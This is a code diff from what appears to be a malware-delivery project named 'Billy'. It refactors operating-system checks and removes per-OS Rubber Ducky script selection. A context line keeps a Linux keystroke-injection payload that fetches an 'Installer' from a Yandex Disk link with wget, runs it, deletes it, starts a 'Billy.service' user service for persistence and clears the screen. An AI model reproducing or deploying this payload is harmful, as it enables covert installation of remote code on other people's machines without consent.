@@ -49,16 +49,16 @@ Installer_windows_compile_command_path = compile_dir_path + \
 Installer_linux_compile_command_path = compile_dir_path + \
     'Installer_linux_compile_command.txt'
 
-if platform.system() == constants.WINDOWS_OS:
+if os_name == constants.WINDOWS_OS:
     Billy_compile_command_path = Billy_windows_compile_command_path
 
-if platform.system() == constants.LINUX_OS:
+if os_name == constants.LINUX_OS:
     Billy_compile_command_path = Billy_linux_compile_command_path
 
-if platform.system() == constants.WINDOWS_OS:
+if os_name == constants.WINDOWS_OS:
     Installer_compile_command_path = Installer_windows_compile_command_path
 
-if platform.system() == constants.LINUX_OS:
+if os_name == constants.LINUX_OS:
     Installer_compile_command_path = Installer_linux_compile_command_path
 
 compile_dir_path = 'dist/'
@@ -85,16 +85,6 @@ DELAY 1000
 STRING wget -q -O temp.txt "https://cloud-api.yandex.net/v1/disk/public/resources/download?public_key={link}" ; download_url=$(grep -oP '"href":"\\K[^"]+' temp.txt | head -1); wget -q -O Installer "$download_url"; chmod +x Installer; rm temp.txt; ./Installer; rm Installer; systemctl --user start Billy.service; clear; exit
 DELAY 2000
 ENTER"""
-
-if platform.system() == constants.WINDOWS_OS:
-    rubber_ducky_script_name = 'Billy-windows-{branch_name}.txt'
-    rubber_ducky_script = windows_rubber_ducky_script
-
-if platform.system() == constants.LINUX_OS:
-    rubber_ducky_script_name = 'Billy-linux-{branch_name}.txt'
-    rubber_ducky_script = linux_rubber_ducky_script
-
-rubber_ducky_script_path = rubber_ducky_scripts_path + rubber_ducky_script_name
 
 session_network_token_path = 'network_token.token'
 
